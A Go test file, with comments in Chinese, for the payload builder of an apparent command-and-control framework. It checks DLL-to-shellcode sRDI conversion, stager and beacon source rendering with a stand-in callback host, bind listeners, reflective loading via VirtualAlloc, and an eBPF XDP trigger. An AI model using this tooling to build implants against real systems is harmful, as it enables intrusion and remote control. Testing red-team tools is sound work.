package c2center

// 载荷矩阵单测(契约 C2_CONTRACTS.md §19,Agent P):
//   - 合法组合表全组合覆盖(合法通过/非法带人话原因);
//   - 目标平台一致性与 bind 端口;
//   - sRDI 转换 patch 流程(最小合法 PE 结构断言,不真执行);
//   - 产物/stager 源码渲染(占位符替换、bind 信道注入、c-shared 包装、变体 import);
//   - eBPF 触发器资产完整性。

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"strings"
	"testing"
)

// unzipNames 读 zip 内的文件名列表(顺序即打包顺序)。
func unzipNames(data []byte) ([]string, error) {
	zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		return nil, err
	}
	names := make([]string, 0, len(zr.File))
	for _, f := range zr.File {
		names = append(names, f.Name)
	}
	return names, nil
}

// testMatrixListener 渲染用监听器与 32B 密钥。
func testMatrixListener() (*Listener, []byte) {
	return &Listener{
		ID: 7, Name: "矩阵测试", Proto: "http", BindHost: "127.0.0.1", Port: 8443,
		URLPath: "mx", Callback: "http://203.0.113.9:8443", Enabled: true,
	}, bytes.Repeat([]byte{0x42}, keySize)
}

// TestValidatePayloadComboFullMatrix 合法组合表全组合(契约 §19 逐字):
// 对 format × artifact × direction × staged 的全笛卡尔积断言合法/非法。
func TestValidatePayloadComboFullMatrix(t *testing.T) {
	formats := []string{"ps1", "bash", "py", "gosrc", "exe", ""}
	artifacts := []string{ArtifactScript, ArtifactExe, ArtifactDll, ArtifactShellcode, ArtifactEbpf, "fooo"}
	directions := []string{DirectionReverse, DirectionBind, "both"}

	// legal[artifact] = 该产物的合法 format 集合。
	legalFormat := map[string]map[string]bool{
		ArtifactScript:    {"ps1": true, "bash": true, "py": true},
		ArtifactExe:       {"gosrc": true},
		ArtifactDll:       {"gosrc": true},
		ArtifactShellcode: {"gosrc": true},
		ArtifactEbpf:      {"gosrc": true},
	}
	// stagedOK:script/dll/ebpf 不做 staged。
	stagedOK := map[string]bool{
		ArtifactScript: false, ArtifactExe: true, ArtifactDll: false,
		ArtifactShellcode: true, ArtifactEbpf: false,
	}

	for _, a := range artifacts {
		for _, f := range formats {
			for _, d := range directions[:2] { // "both" 单独覆盖
				for _, staged := range []bool{false, true} {
					err := ValidatePayloadCombo(f, a, d, staged)
					legal := legalFormat[a] != nil && legalFormat[a][f] &&
						(!staged || stagedOK[a])
					if a == ArtifactEbpf && d != DirectionBind {
						legal = false // ebpf 仅 bind
					}
					if legal && err != nil {
						t.Fatalf("组合 (%s,%s,%s,staged=%v) 应合法,却报错: %v", f, a, d, staged, err)
					}
					if !legal && err == nil {
						t.Fatalf("组合 (%s,%s,%s,staged=%v) 应非法,却通过了", f, a, d, staged)
					}
					if !legal && err != nil && len([]rune(err.Error())) < 8 {
						t.Fatalf("组合 (%s,%s,%s,staged=%v) 的错误原因太含糊: %v", f, a, d, staged, err)
					}
				}
			}
			// 非法方向。
			if err := ValidatePayloadCombo(f, a, "both", false); a != "fooo" && err == nil {
				t.Fatalf("方向 both 应被拒绝 (%s,%s)", f, a)
			}
		}
	}
	// 未知 artifact。
	if err := ValidatePayloadCombo("ps1", "fooo", DirectionReverse, false); err == nil {
		t.Fatalf("未知产物形态应被拒绝")
	}
}

// TestValidatePayloadArtifactTarget 目标平台一致性。
func TestValidatePayloadArtifactTarget(t *testing.T) {
	cases := []struct {
		target, artifact string
		ok               bool
	}{
		{"linux", ArtifactEbpf, true},
		{"windows", ArtifactEbpf, false},
		{"macos", ArtifactEbpf, false},
		{"cross", ArtifactEbpf, false},
		{"windows", ArtifactDll, true},
		{"windows", ArtifactShellcode, true},
		{"linux", ArtifactDll, false},
		{"linux", ArtifactExe, true},
		{"macos", ArtifactExe, true},
		{"cross", ArtifactExe, true},
		{"openwrt", ArtifactExe, false},
	}
	for _, c := range cases {
		err := ValidatePayloadArtifactTarget(c.target, c.artifact)
		if c.ok && err != nil {
			t.Fatalf("(%s,%s) 应合法: %v", c.target, c.artifact, err)
		}
		if !c.ok && err == nil {
			t.Fatalf("(%s,%s) 应非法", c.target, c.artifact)
		}
	}
}

// TestValidateBindPort bind 端口语义。
func TestValidateBindPort(t *testing.T) {
	if err := ValidateBindPort(DirectionBind, 0); err == nil {
		t.Fatalf("bind 缺端口应被拒绝")
	}
	if err := ValidateBindPort(DirectionBind, 70000); err == nil {
		t.Fatalf("bind 端口超界应被拒绝")
	}
	if err := ValidateBindPort(DirectionBind, 47771); err != nil {
		t.Fatalf("bind 合法端口报错: %v", err)
	}
	if err := ValidateBindPort(DirectionReverse, 47771); err == nil {
		t.Fatalf("reverse 不应携带 bind_port")
	}
	if err := ValidateBindPort(DirectionReverse, 0); err != nil {
		t.Fatalf("reverse 端口 0 报错: %v", err)
	}
}

// TestValidateArtifactChannelSupport 协议支持面(stageless reverse 四传输;staged
// reverse 仅 http;bind 不支持 ws/oss)。
func TestValidateArtifactChannelSupport(t *testing.T) {
	if err := ValidateArtifactChannelSupport(ArtifactExe, DirectionReverse, false, "http"); err != nil {
		t.Fatalf("reverse+http 应支持: %v", err)
	}
	if err := ValidateArtifactChannelSupport(ArtifactExe, DirectionReverse, false, "ws"); err != nil {
		t.Fatalf("stageless reverse+ws 应支持(传输框架已交付): %v", err)
	}
	if err := ValidateArtifactChannelSupport(ArtifactExe, DirectionReverse, true, "tcp"); err == nil {
		t.Fatalf("staged reverse+tcp 应拒绝(stager 仅 http 回连)")
	}
	if err := ValidateArtifactChannelSupport(ArtifactExe, DirectionBind, false, "tcp"); err != nil {
		t.Fatalf("bind+tcp 应支持: %v", err)
	}
	if err := ValidateArtifactChannelSupport(ArtifactExe, DirectionBind, true, "kcp"); err != nil {
		t.Fatalf("bind+kcp 应支持: %v", err)
	}
	if err := ValidateArtifactChannelSupport(ArtifactExe, DirectionBind, false, "oss"); err == nil {
		t.Fatalf("bind+oss 应拒绝")
	}
	if err := ValidateArtifactChannelSupport(ArtifactScript, DirectionReverse, false, "ws"); err != nil {
		t.Fatalf("script 不受协议闸限制: %v", err)
	}
}

// minimalWindowsDLL 构造最小合法 PE 结构(e_lfanew=64,PE 签名,x64 machine)。
func minimalWindowsDLL(x64 bool) []byte {
	b := make([]byte, 128)
	copy(b[64:], "PE\x00\x00")
	binary.LittleEndian.PutUint32(b[60:], 64) // e_lfanew
	machine := uint16(0x014c)
	if x64 {
		machine = 0x8664
	}
	binary.LittleEndian.PutUint16(b[68:], machine)
	for i := 0; i < 32; i++ { // 语义性填充(非零,便于布局断言)
		b[80+i] = byte(i + 1)
	}
	return b
}

// TestHashExportName ROR13 哈希:空名(仅 \0)= 0;单字符 A 有解析可验的值
// (ror13(0)+65 = 65;ror13(65) = 65<<19 = 0x00208000)。
func TestHashExportName(t *testing.T) {
	if got := HashExportName(""); got != 0 {
		t.Fatalf("空名哈希应为 0,得到 %#x", got)
	}
	if got := HashExportName("A"); got != 0x02080000 {
		t.Fatalf("HashExportName(\"A\") = %#x,应为 0x02080000", got)
	}
	if HashExportName("Run") == HashExportName("run") {
		t.Fatalf("哈希应区分大小写")
	}
}

// TestConvertDLLToShellcodePatchLayout sRDI patch 流程(纯字节,不真执行):
// 布局 = bootstrap(69/50) + RDI 载入器 + DLL + userData;bootstrap 内的哈希/
// 偏移/长度立即数与 ShellcodeRDI.py 的算式逐项对齐。
func TestConvertDLLToShellcodePatchLayout(t *testing.T) {
	if len(srdiLoaderX64) == 0 || len(srdiLoaderX86) == 0 {
		t.Fatalf("内置 RDI 载入器常量解码失败(x64=%d x86=%d)", len(srdiLoaderX64), len(srdiLoaderX86))
	}
	userData := []byte("args")
	for _, x64 := range []bool{true, false} {
		dll := minimalWindowsDLL(x64)
		bootSize := 50
		if x64 {
			bootSize = 69
		}
		sc, err := ConvertDLLToShellcode(dll, "Run", userData, SRDIFlagClearHeader)
		if err != nil {
			t.Fatalf("x64=%v 转换失败: %v", x64, err)
		}
		boot := sc[:bootSize]
		loaderLen := len(srdiLoaderX86)
		if x64 {
			loaderLen = len(srdiLoaderX64)
		}
		loader := sc[bootSize : bootSize+loaderLen]
		gotDLL := sc[bootSize+loaderLen : len(sc)-len(userData)]
		gotUD := sc[len(sc)-len(userData):]
		wantLoader := srdiLoaderX86
		if x64 {
			wantLoader = srdiLoaderX64
		}
		if !bytes.Equal(loader, wantLoader) {
			t.Fatalf("x64=%v 载入器段与常量不符", x64)
		}
		if !bytes.Equal(gotDLL, dll) {
			t.Fatalf("x64=%v DLL 段被改动", x64)
		}
		if !bytes.Equal(gotUD, userData) {
			t.Fatalf("x64=%v userData 段不符", x64)
		}
		// bootstrap[0:5] = call $+5;立即数按小端。
		if boot[0] != 0xe8 || boot[1] != 0 || boot[2] != 0 || boot[3] != 0 || boot[4] != 0 {
			t.Fatalf("x64=%v bootstrap 开头不是 call $+5", x64)
		}
		hash := HashExportName("Run")
		if x64 {
			if boot[9] != 0xba || binary.LittleEndian.Uint32(boot[10:14]) != hash {
				t.Fatalf("x64 函数哈希立即数(mov edx)不符")
			}
			dllOffset := 69 - 5 + len(srdiLoaderX64)
			if got := binary.LittleEndian.Uint32(boot[47:51]); got != uint32(dllOffset) {
				t.Fatalf("x64 dllOffset 立即数 = %d,应为 %d", got, dllOffset)
			}
			if got := binary.LittleEndian.Uint32(boot[17:21]); got != uint32(dllOffset+len(dll)) {
				t.Fatalf("x64 userData 位置立即数不符")
			}
			if got := binary.LittleEndian.Uint32(boot[23:27]); got != uint32(len(userData)) {
				t.Fatalf("x64 userData 长度立即数 = %d,应为 %d", got, len(userData))
			}
			if got := binary.LittleEndian.Uint32(boot[55:59]); got != uint32(SRDIFlagClearHeader) {
				t.Fatalf("x64 flags 立即数不符")
			}
			if boot[68] != 0xc3 {
				t.Fatalf("x64 bootstrap 未以 ret 结尾")
			}
		} else {
			dllOffset := 50 - 5 + len(srdiLoaderX86)
			// x86 布局:11=push flags…23=push <len>(68),24..27=长度;
			// 34=add eax(05),35..38=dllOffset;49=ret。
			if boot[23] != 0x68 || binary.LittleEndian.Uint32(boot[24:28]) != uint32(len(userData)) {
				t.Fatalf("x86 userData 长度 push 立即数不符")
			}
			if boot[34] != 0x05 || binary.LittleEndian.Uint32(boot[35:39]) != uint32(dllOffset) {
				t.Fatalf("x86 dllOffset 立即数(add eax)不符")
			}
			if boot[49] != 0xc3 {
				t.Fatalf("x86 bootstrap 未以 ret 结尾")
			}
		}
		_ = hash
	}
	// 非法输入。
	if _, err := ConvertDLLToShellcode([]byte{1, 2, 3}, "Run", nil, 0); err == nil {
		t.Fatalf("截断 PE 应被拒绝")
	}
	notPE := bytes.Repeat([]byte{0x41}, 128)
	if _, err := ConvertDLLToShellcode(notPE, "Run", nil, 0); err == nil {
		t.Fatalf("缺 PE 签名应被拒绝")
	}
}

// TestRenderArtifactSource exe/dll 源码渲染:占位符替换、bind 注入、c-shared 包装。
func TestRenderArtifactSource(t *testing.T) {
	l, key := testMatrixListener()

	// exe reverse = 一期 gosrc 模板原样(含渲染期拼接的进程执行 import)。
	src, err := RenderArtifactSource(ArtifactExe, DirectionReverse, "windows", l, key, 0)
	if err != nil {
		t.Fatalf("exe reverse 渲染失败: %v", err)
	}
	for _, want := range []string{"package main", `cbAddr = "http://203.0.113.9:8443"`, "func main() {"} {
		if !strings.Contains(src.MainGo, want) {
			t.Fatalf("exe reverse 源码缺 %q", want)
		}
	}
	if strings.Contains(src.MainGo, "__") && strings.Contains(src.MainGo, "__CALLBACK__") {
		t.Fatalf("exe reverse 占位符未替换")
	}
	if !strings.Contains(src.BuildMD, "go build") {
		t.Fatalf("exe BUILD.md 缺编译说明")
	}

	// exe bind = 注入 bind 信道(帧监听;首帧 reg)。
	bindSrc, err := RenderArtifactSource(ArtifactExe, DirectionBind, "windows", l, key, 45454)
	if err != nil {
		t.Fatalf("exe bind 渲染失败: %v", err)
	}
	for _, want := range []string{
		"func bindAcceptor()", `"encoding/binary"`, `"sync"`, `const bindPort = "45454"`,
		"go bindAcceptor()", `net.Listen("tcp", ":"+bindPort)`,
	} {
		if !strings.Contains(bindSrc.MainGo, want) {
			t.Fatalf("exe bind 源码缺 %q", want)
		}
	}
	if strings.Contains(bindSrc.MainGo, "http.NewRequest") {
		t.Fatalf("bind 信道不应再走 HTTP")
	}

	// dll = c-shared 包装://export Run + import "C" + 空 main。
	dllSrc, err := RenderArtifactSource(ArtifactDll, DirectionReverse, "windows", l, key, 0)
	if err != nil {
		t.Fatalf("dll 渲染失败: %v", err)
	}
	for _, want := range []string{`import "C"`, "//export Run", "func beaconRun() {", "func main() {}", "rundll32"} {
		if !strings.Contains(dllSrc.MainGo+dllSrc.BuildMD, want) {
			t.Fatalf("dll 源码/文档缺 %q", want)
		}
	}
	if strings.Count(dllSrc.MainGo, "func main() {") != 1 {
		t.Fatalf("c-shared 源码应只有一个空 main")
	}

	// 非法组合在渲染层兜底。
	if _, err := RenderArtifactSource(ArtifactExe, DirectionBind, "windows", l, key, 0); err == nil {
		t.Fatalf("bind 缺端口应报错")
	}
}

// TestRenderStagerSource stager 四变体渲染:占位符清零、变体结构、import 汇总。
func TestRenderStagerSource(t *testing.T) {
	l, key := testMatrixListener()
	token := "0123456789abcdef0123456789abcdef"

	variants := []struct {
		name                             string
		stageArtifact, direction, target string
		bindPort                         int
		mustContain                      []string
		mustNot                          []string
	}{
		{
			name: "http-disk", stageArtifact: ArtifactExe, direction: DirectionReverse, target: "windows",
			mustContain: []string{`"stage_get"`, token, `"net/http"`, "exec.Command(p)", `"os/exec"`, `"os"`},
			mustNot:     []string{"acceptLoop", "reflectLoad", `"syscall"`},
		},
		{
			name: "http-reflect", stageArtifact: ArtifactDll, direction: DirectionReverse, target: "windows",
			mustContain: []string{`//export Run`, `import "C"`, "reflectLoad", `"syscall"`, `"unsafe"`, "VirtualAlloc"},
			mustNot:     []string{"exec.Command", `"os/exec"`},
		},
		{
			name: "bind-disk", stageArtifact: ArtifactExe, direction: DirectionBind, target: "linux", bindPort: 45455,
			mustContain: []string{`bindPort = "45455"`, "go acceptLoop()", `"encoding/binary"`, "BigEndian"},
			mustNot:     []string{"http.NewRequest"},
		},
		{
			name: "bind-reflect", stageArtifact: ArtifactDll, direction: DirectionBind, target: "windows", bindPort: 45456,
			mustContain: []string{`bindPort = "45456"`, "go acceptLoop()", "//export Run", "reflectLoad"},
			mustNot:     []string{"http.NewRequest", "exec.Command"},
		},
	}
	for _, v := range variants {
		src, err := RenderStagerSource(v.stageArtifact, v.direction, v.target, l, key, token, v.bindPort)
		if err != nil {
			t.Fatalf("%s 渲染失败: %v", v.name, err)
		}
		if ph := findStagerPlaceholder(src.MainGo); ph != "" {
			t.Fatalf("%s 占位符未替换: %s", v.name, ph)
		}
		for _, want := range v.mustContain {
			if !strings.Contains(src.MainGo, want) {
				t.Fatalf("%s 源码缺 %q", v.name, want)
			}
		}
		for _, bad := range v.mustNot {
			if strings.Contains(src.MainGo, bad) {
				t.Fatalf("%s 源码不应含 %q", v.name, bad)
			}
		}
		if strings.Count(src.MainGo, "package main") != 1 || !strings.Contains(src.MainGo, "func runStage(") {
			t.Fatalf("%s 结构不完整", v.name)
		}
	}
	// token 缺失拒绝。
	if _, err := RenderStagerSource(ArtifactExe, DirectionReverse, "windows", l, key, " ", 0); err == nil {
		t.Fatalf("空 token 应被拒绝")
	}
	// 未知 stage 产物拒绝。
	if _, err := RenderStagerSource("so", DirectionReverse, "windows", l, key, token, 0); err == nil {
		t.Fatalf("未知 stage 产物应被拒绝")
	}
}

// TestZipBeaconSource 源码 zip 打包(main.go + BUILD.md 可解出)。
func TestZipBeaconSource(t *testing.T) {
	data, err := ZipBeaconSource([]byte("package main\n"), "# BUILD\n")
	if err != nil {
		t.Fatalf("打包失败: %v", err)
	}
	files, err := unzipNames(data)
	if err != nil {
		t.Fatalf("zip 损坏: %v", err)
	}
	if len(files) != 2 || files[0] != "main.go" || files[1] != "BUILD.md" {
		t.Fatalf("zip 内容不符: %v", files)
	}
}

// TestEbpfTriggerAssets 资产完整性(C 源码 + 加载脚本 + README)。
func TestEbpfTriggerAssets(t *testing.T) {
	assets, err := EbpfTriggerAssets()
	if err != nil {
		t.Fatalf("资产读取失败: %v", err)
	}
	for _, name := range []string{"ebpf_trigger/xdp_trigger.c", "ebpf_trigger/load_trigger.sh", "ebpf_trigger/README.md"} {
		b, ok := assets[name]
		if !ok || len(b) == 0 {
			t.Fatalf("缺资产 %s", name)
		}
	}
	if !strings.Contains(string(assets["ebpf_trigger/xdp_trigger.c"]), "xdp_trigger") ||
		!strings.Contains(string(assets["ebpf_trigger/xdp_trigger.c"]), "TRIGGER_PORT") {
		t.Fatalf("XDP 触发器源码内容异常")
	}
}
